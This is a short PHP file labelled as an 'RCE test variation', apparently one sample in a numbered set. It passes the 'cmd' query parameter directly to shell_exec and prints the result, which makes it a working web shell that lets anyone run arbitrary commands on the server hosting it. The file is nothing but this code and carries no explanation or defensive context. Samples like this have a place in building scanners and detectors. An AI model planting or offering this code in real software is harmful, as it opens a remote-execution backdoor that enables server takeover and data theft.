<?php
// RCE test variation #136
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>